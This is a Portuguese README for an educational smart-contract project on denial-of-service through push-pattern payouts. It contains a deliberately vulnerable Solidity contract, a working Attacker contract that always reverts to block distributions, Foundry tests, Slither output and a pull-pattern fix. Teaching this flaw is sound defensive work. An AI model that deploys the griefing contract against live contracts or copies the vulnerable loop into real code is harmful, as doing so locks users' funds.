# 🛡️ Ataque DoS (Denial of Service) em Smart Contracts

## 📖 Índice
- [O que é DoS em Smart Contracts?](#o-que-é-dos-em-smart-contracts)
- [A Vulnerabilidade](#a-vulnerabilidade)
- [Como o Ataque Funciona](#como-o-ataque-funciona)
- [Estrutura do Projeto](#estrutura-do-projeto)
- [Implementação Detalhada](#implementação-detalhada)
- [Como Rodar os Testes](#como-rodar-os-testes)
- [Solução: Pull Pattern](#solução-pull-pattern)
- [Boas Práticas](#boas-práticas)

---

## O que é DoS em Smart Contracts?

**Denial of Service (DoS)** em Smart Contracts ocorre quando um atacante consegue tornar um contrato **permanentemente inutilizável** ou bloquear funcionalidades críticas, impedindo que usuários legítimos interajam com ele.

### Exemplo Real
Imagine um contrato que distribui fundos para vários usuários. Se um único usuário malicioso **rejeitar o pagamento**, todo o processo pode falhar, travando os fundos de todos.

---

## A Vulnerabilidade

### Push Pattern - O Problema

O **Push Pattern** envia valores diretamente para múltiplos endereços em um loop:

```solidity
function distribute() external {
    uint256 amount = address(this).balance / users.length;
    
    for (uint256 i = 0; i < users.length; i++) {
        (bool success, ) = payable(users[i]).call{value: amount}("");
        require(success, "Transfer failed"); // Se falhar, TODO mundo perde!
    }
}
```

### Por que isso é perigoso?

1. **Falha em Cascata**: Se UMA transferência falhar, TODAS falham
2. **Ataque Trivial**: Basta criar um contrato que rejeite ETH
3. **Fundos Travados**: O contrato fica inutilizável permanentemente
4. **Custo Zero**: O atacante não gasta nada para bloquear o sistema

---

## Como o Ataque Funciona

### Passo 1: Contrato Vulnerável (`Vulnerable.sol`)

```solidity
contract Vulnerable {
    address[] public users;
    
    function register() external {
        users.push(msg.sender);  // Qualquer um pode se registrar
    }
    
    function distribute() external {
        uint256 amount = address(this).balance / users.length;
        
        for (uint256 i = 0; i < users.length; i++) {
            (bool success, ) = payable(users[i]).call{value: amount}("");
            require(success, "Transfer failed"); // VULNERÁVEL
        }
    }
}
```

### Passo 2: Contrato Atacante (`Attacker.sol`)

```solidity
contract Attacker {
    function register(address vulnerable) external {
        // Registra-se como usuário normal
        vulnerable.call(abi.encodeWithSignature("register()"));
    }
    
    // SEMPRE REVERTE ao receber ETH
    receive() external payable {
        revert("nope");  // Bloqueia todo o processo!
    }
}
```

### Passo 3: Sequência do Ataque

```
1. User1 registra-se     ✅
2. User2 registra-se     ✅
3. Attacker registra-se  ✅ (parece legítimo)

4. distribute() é chamada:
   ├─ Transfere para User1    ✅ (3.33 ETH)
   ├─ Transfere para User2    ✅ (3.33 ETH)
   └─ Transfere para Attacker ❌ REVERT!
   
5. TODA a transação é revertida!
6. Os 10 ETH ficam TRAVADOS no contrato
```

---

## Estrutura do Projeto

```
dos-attack/
├── src/
│   ├── Vulnerable.sol        # Contrato vulnerável (Push Pattern)
│   ├── VulnerableFixed.sol   # Versão segura (Pull Pattern)
│   └── Attacker.sol          # Contrato malicioso
├── test/
│   ├── Dos.t.sol             # Testes do ataque (7 testes)
│   └── DosFixed.t.sol        # Testes da solução (11 testes)
└── README.md                 # Este arquivo
```

---

## Implementação Detalhada

### Contrato Vulnerável - Análise Completa

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Vulnerable {
    address[] public users;  // Lista de usuários registrados

    // Qualquer um pode se registrar
    function register() external {
        users.push(msg.sender);
    }

    // Aceita ETH via receive
    receive() external payable {}

    // ❌ FUNÇÃO VULNERÁVEL - Push Pattern
    function distribute() external {
        uint256 amount = address(this).balance / users.length;

        // Loop que envia para todos
        for (uint256 i = 0; i < users.length; i++) {
            (bool success, ) = payable(users[i]).call{value: amount}("");
            require(success, "Transfer failed");  // ← PROBLEMA AQUI!
        }
    }
    
    // Funções auxiliares
    function getUserCount() external view returns (uint256) {
        return users.length;
    }
    
    function getUser(uint256 index) external view returns (address) {
        return users[index];
    }
}
```

**Por que é vulnerável?**
- ✅ `register()` não valida quem está se registrando
- ❌ `distribute()` depende do sucesso de TODAS as transferências
- ❌ Um único `revert` bloqueia TODO o sistema
- ❌ Não há forma de remover usuários maliciosos

### Contrato Atacante - Como Bloqueia

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Attacker {
    // Registra-se no contrato vulnerável
    function register(address vulnerable) external {
        (bool ok, ) = vulnerable.call(
            abi.encodeWithSignature("register()")
        );
        require(ok);
    }

    // SEMPRE REVERTE - bloqueia distribute()
    receive() external payable {
        revert("nope");  // Qualquer mensagem funciona
    }
}
```

**Como funciona o ataque:**
1. Atacante deploya `Attacker.sol`
2. Chama `attacker.register(address(vulnerable))`
3. Agora está na lista `users[]`
4. Quando `distribute()` for chamada:
   - Loop tenta enviar ETH para o atacante
   - `receive()` reverte com "nope"
   - `require(success)` falha
   - **Toda a transação reverte**

---

## Como Rodar os Testes

### Comandos Básicos

```bash
# 1. Compilar os contratos
forge build

# 2. Rodar todos os testes
forge test

# 3. Testes com detalhes
forge test -vv

# 4. Testes com stack traces
forge test -vvv

# 5. Rodar teste específico do ataque
forge test --match-test test_DoSAttack -vvv

# 6. Ver cobertura de código
forge coverage

# 7. Relatório de gas
forge test --gas-report
```

### Suite de Testes - Dos.t.sol

**7 testes que demonstram o ataque:**

#### 1. `test_DoSAttack` - O Ataque Principal
```solidity
function test_DoSAttack() public {
    assertEq(vulnerable.getUserCount(), 3);
    assertEq(address(vulnerable).balance, 10 ether);
    
    // Espera que a distribuição falhe devido ao attacker
    vm.expectRevert(bytes("Transfer failed"));
    vulnerable.distribute();
    
    // Verifica que o saldo não mudou (nada foi distribuído)
    assertEq(address(vulnerable).balance, 10 ether);
}
```
**O que testa:** Prova que o atacante bloqueia `distribute()` completamente.

#### 2. `test_Register` - Registro de Usuários
```solidity
function test_Register() public {
    assertEq(vulnerable.getUserCount(), 3);
    assertEq(vulnerable.getUser(0), user1);
    assertEq(vulnerable.getUser(1), user2);
    assertEq(vulnerable.getUser(2), address(attacker));
}
```
**O que testa:** Verifica que qualquer um (incluindo atacantes) pode se registrar.

#### 3. `test_ReceiveEther` - Depósito Funciona
```solidity
function test_ReceiveEther() public {
    vm.deal(user1, 5 ether);
    vm.prank(user1);
    (bool success, ) = address(vulnerable).call{value: 5 ether}("");
    
    assertTrue(success);
    assertEq(address(vulnerable).balance, 15 ether);
}
```
**O que testa:** Contrato consegue receber ETH normalmente.

#### 4. `test_SuccessfulDistribution` - Sem Atacante Funciona
```solidity
function test_SuccessfulDistribution() public {
    Vulnerable cleanVulnerable = new Vulnerable();
    vm.deal(address(cleanVulnerable), 10 ether);
    
    vm.prank(user1);
    cleanVulnerable.register();
    
    vm.prank(user2);
    cleanVulnerable.register();
    
    cleanVulnerable.distribute();
    
    assertEq(address(cleanVulnerable).balance, 0);
    assertEq(user1.balance, 5 ether);
    assertEq(user2.balance, 5 ether);
}
```
**O que testa:** Prova que sem atacante, a distribuição funciona perfeitamente.

#### 5. `test_AttackerRevertsOnReceive` - Atacante Rejeita ETH
```solidity
function test_AttackerRevertsOnReceive() public {
    vm.deal(user1, 1 ether);
    vm.prank(user1);
    
    (bool success, ) = address(attacker).call{value: 1 ether}("");
    
    assertFalse(success);
    assertEq(user1.balance, 1 ether);
}
```
**O que testa:** Confirma que o atacante sempre rejeita ETH.

#### 6. `test_AttackerRegistration` - Registro via Contrato
```solidity
function test_AttackerRegistration() public {
    Vulnerable newVulnerable = new Vulnerable();
    Attacker newAttacker = new Attacker();
    
    newAttacker.register(address(newVulnerable));
    
    assertEq(newVulnerable.getUserCount(), 1);
    assertEq(newVulnerable.getUser(0), address(newAttacker));
}
```
**O que testa:** Atacante consegue se registrar via função externa.

#### 7. `test_MultipleAttackersDoS` - Vários Atacantes
```solidity
function test_MultipleAttackersDoS() public {
    Attacker attacker1 = new Attacker();
    Attacker attacker2 = new Attacker();
    
    attacker1.register(address(newVulnerable));
    attacker2.register(address(newVulnerable));
    
    vm.expectRevert(bytes("Transfer failed"));
    newVulnerable.distribute();
}
```
**O que testa:** Mesmo com múltiplos atacantes, basta UM para bloquear tudo.

## 🔍 Análise de Vulnerabilidade (Slither)

Para garantir a segurança do contrato e confirmar a vulnerabilidade de forma automatizada, utilizamos o **Slither**, uma ferramenta de análise estática padrão da indústria.

### 1. Executando a Análise
Para reproduzir a análise, execute o seguinte comando no terminal:

```bash
slither src/Vulnerable.sol

INFO:Detectors:
Vulnerable.distribute() (src/Vulnerable.sol#13-21) sends eth to arbitrary user
	Dangerous calls:
	- (success,None) = address(users[i]).call{value: amount}() (src/Vulnerable.sol#18)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations
INFO:Detectors:
Vulnerable.distribute() (src/Vulnerable.sol#13-21) has external calls inside a loop: (success,None) = address(users[i]).call{value: amount}() (src/Vulnerable.sol#18)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation/#calls-inside-a-loop
INFO:Detectors:
Version constraint ^0.8.20 contains known severe issues (https://solidity.readthedocs.io/en/latest/bugs.html)
	- VerbatimInvalidDeduplication
	- FullInlinerNonExpressionSplitArgumentEvaluationOrder
	- MissingSideEffectsOnSelectorAccess.
It is used by:
	- ^0.8.20 (src/Vulnerable.sol#2)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity
INFO:Detectors:
Low level call in Vulnerable.distribute() (src/Vulnerable.sol#13-21):
	- (success,None) = address(users[i]).call{value: amount}() (src/Vulnerable.sol#18)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#low-level-calls
INFO:Detectors:
Loop condition i < users.length (src/Vulnerable.sol#16) should use cached array length instead of referencing `length` member of the storage array.
 Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#cache-array-length
INFO:Slither:src/Vulnerable.sol analyzed (1 contracts with 100 detectors), 5 result(s) found


### Interpretação dos Riscos

### Interpretação dos Riscos

* 🔴 **`calls-loop` (Crítica)**
    Confirma a presença de chamadas externas (`.call`) dentro de um laço `for`. Este é o vetor principal do **DoS**: se uma única transferência falhar, toda a função trava.

* 🟠 **`arbitrary-send` (Média)**
    Alerta que o contrato envia ETH para endereços arbitrários (os usuários). Exige validação rigorosa para evitar drenagem de fundos ou reentrância.

* 🟡 **`cache-array-length` (Otimização/Gás)**
    Detectou que `users.length` é lido do *storage* a cada volta do loop.
    * **O Problema:** Ler do *storage* é uma operação cara (Opcode `SLOAD`).
    * **Impacto no DoS:** O consumo excessivo de gás faz com que a transação atinja o **Block Gas Limit** muito mais rápido. Ou seja, o contrato trava com uma quantidade de usuários muito menor do que se o tamanho estivesse salvo em memória (`mload`).

## Solução: Pull Pattern

### VulnerableFixed.sol - Implementação Segura

```solidity
contract VulnerableFixed {
    address[] public users;
    mapping(address => uint256) public balances;  // ← Saldos internos
    
    function register() external {
        users.push(msg.sender);
    }

    receive() external payable {}

    // ✅ SEGURO - Apenas atualiza estado interno
    function distribute() external {
        uint256 amount = address(this).balance / users.length;

        for (uint256 i = 0; i < users.length; i++) {
            balances[users[i]] += amount;  // ← SEM transferências externas!
        }
    }
    
    // ✅ Cada usuário saca individualmente
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");
        
        // Checks-Effects-Interactions Pattern
        balances[msg.sender] = 0;  // ← Zera ANTES de enviar
        
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        
        // Se falhar, restaura o saldo
        if (!success) {
            balances[msg.sender] = amount;
            revert("Transfer failed");
        }
    }
}
```

### Por que isso é seguro?

**Falhas são isoladas**: Se um usuário falha, outros não são afetados  
**Sem loops de transferências**: `distribute()` só atualiza estado  
**Controle individual**: Cada usuário controla seu próprio saque  
**CEI Pattern**: Checks-Effects-Interactions previne reentrancy  
**Recuperável**: Se falhar, saldo é mantido para nova tentativa  

### Comparação: Push vs Pull

| Aspecto | Push (Vulnerável) | Pull (Seguro) |
|---------|-------------------|---------------|
| Transferências | Em loop | Individuais |
| Falha de um usuário | Bloqueia todos | Afeta só ele |
| Gas | Alto (loop) | Baixo (on-demand) |
| Reentrancy | Risco | Protegido |
| DoS | Vulnerável | Imune |

---

### Vulnerabilidades Relacionadas
- **SWC-113**: DoS with Failed Call
- **SWC-128**: DoS with Block Gas Limit
- **SWC-126**: Insufficient Gas Griefing
